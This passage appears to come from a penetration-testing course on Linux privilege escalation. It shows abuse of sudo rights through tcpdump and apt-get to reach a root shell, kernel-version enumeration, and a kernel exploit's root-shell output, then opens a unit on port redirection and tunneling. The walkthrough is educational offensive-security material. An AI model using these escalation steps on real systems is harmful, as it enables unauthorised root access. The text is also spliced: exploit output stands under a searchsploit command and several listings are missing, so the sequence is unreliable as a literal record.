### 17.4.2 Abusing Sudo Permissions

User `joe` may run the following commands on `debian-privesc` with sudo privileges:
- `(ALL) (ALL) /usr/bin/crontab -l`
- `(ALL) (ALL) /usr/sbin/tcpdump`
- `(ALL) (ALL) /usr/bin/apt-get`

**Listing 503: Inspecting Current User’s Sudo Permissions**

From the output in Listing 503, we observe that only the `crontab`, `tcpdump`, and `apt-get` utilities are listed as allowing sudo commands. If the `/etc/sudoers` configurations are too permissive, a user could abuse these short-lived administrative rights to obtain permanent root access.

Since the first command, `crontab -l`, does not allow editing of crontab entries, it is unlikely to provide an escalation route. The second command, `tcpdump`, appears more promising. We will consult GTFOBins for suggestions on how to abuse this command.

**Running the Hinted Commands**

```bash
joe@debian-privesc:~$ COMMAND='id'
joe@debian-privesc:~$ TF=$(mktemp)
joe@debian-privesc:~$ echo "$COMMAND" > $TF
joe@debian-privesc:~$ chmod +x $TF
joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
[sudo] password for joe:
dropped privs to root
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...
compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied
```

**Listing 504: Attempting to Abuse `tcpdump` Sudo Permissions**

Surprisingly, executing the suggested command-set results in a "permission denied" error message. To further investigate, we can inspect the syslog file for any occurrences of the `tcpdump` keyword.

```bash
joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400
audit(1661759534.607:27): apparmor="DENIED" operation="exec"
profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump"
requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
```

**Listing 505: Inspecting the Syslog File for `tcpdump` Related Events**

The output in Listing 505 shows that the audit daemon has logged our privilege escalation attempt. Closer inspection reveals that AppArmor was triggered and blocked us. AppArmor is a kernel module that provides mandatory access control (MAC) on Linux systems by running various application-specific profiles. It is enabled by default on Debian 10. We can verify AppArmor’s status using the `aa-status` command.

```bash
joe@debian-privesc:~$ su - root
Password: 
root@debian-privesc:~# aa-status
apparmor module is loaded.
20 profiles are loaded.
18 profiles are in enforce mode.
...
/usr/sbin/tcpdump
...
2 profiles are in complain mode.
libreoffice-oopslash
libreoffice-soffice
3 processes have profiles defined.
3 processes are in enforce mode.
...
```

**Listing 506: Verifying AppArmor Status**

Listing 506 confirms that `tcpdump` is actively protected with a dedicated AppArmor profile. Since the first two commands from the `sudoers` file did not work, let’s examine the third allowed sudo command: `apt-get`. Returning to GTFOBins, we select the first option. The payload runs the `changelog` apt-get command option, invoking the `less` application from which we can execute a bash shell.

```bash
joe@debian-privesc:~$ sudo apt-get changelog apt
... 
Fetched 459 kB in 0s (39.7 MB/s)
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Listing 508: Obtaining a Root Shell by Abusing Sudo Permissions**

We successfully obtained a privileged root shell by abusing a misconfigured sudo configuration.

### 17.4.3 Exploiting Kernel Vulnerabilities

Kernel exploits are an effective way to escalate privileges, but success depends on matching both the target’s kernel version and the operating system flavor, such as Debian, RHEL, Gentoo, etc.

To demonstrate this attack vector, we first gather information about our Ubuntu target by inspecting the `/etc/issue` file:

```bash
joe@ubuntu-privesc:~$ cat /etc/issue
Ubuntu 16.04.4 LTS \n \l
```

**Listing 509: Gathering General Information on the Target System**

Next, we inspect the kernel version and system architecture using standard system commands:

```bash
joe@ubuntu-privesc:~$ uname -r
4.4.0-116-generic
joe@ubuntu-privesc:~$ arch
x86_64
```

**Listing 510: Gathering Kernel and Architecture Information from Our Linux Target**

Our target system is running Ubuntu 16.04.4 LTS (kernel 4.4.0-116-generic) on the x86_64 architecture. Using this information, we can use `searchsploit` on our local Kali system to find kernel exploits matching the target version. We filter out anything below kernel version 4.4.0 and anything that matches kernel version 4.8.

```bash
kali@kali:~$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v "4.8"
[*] Leaking sock struct from ffff880079bd9c00
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880075c11e40
[*] UID from cred structure: 1001, matches the current: 1001
[*] hammering cred structure at ffff880075c11e40
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),1001(joe)
#
```

**Listing 517: Obtaining a Root Shell via Kernel Exploitation**

We managed to obtain a root shell by exploiting a known kernel vulnerability. In this section, we learned how to manually enumerate our target for known kernel vulnerabilities, use `searchsploit` to select the right exploit source code, compile the exploit, and run it against the target machine to gain an administrative shell.

### 17.5 Wrapping Up

In this module, we covered many concepts surrounding Linux privilege escalation. We explored both manual and automated enumeration techniques that reveal required information for these types of attacks. We also examined how to gain administrative access via unprotected credentials, insecure file permissions, and binary flags. We concluded by learning how to enumerate for kernel vulnerabilities and find matching exploits.

---

### 18 Port Redirection and SSH Tunneling

#### 18.1 Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:
1. Understand the difference between common network layouts.
2. Consider the impact of common network security devices.
3. Understand when to use port redirection and tunneling techniques.

Most network environments are not (and should not be) flat. In a flat network, all devices can communicate freely with each other, with little or no attempt to limit access. This is generally considered poor security practice because once an attacker gains access to a single host, they can easily spread through the network and compromise other hosts.

A more securely-designed network is segmented. This type of network is broken into smaller networks, each called a subnet. Each subnet contains a group of devices with a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers because compromising a single host no longer gives them free access to every other device on the network.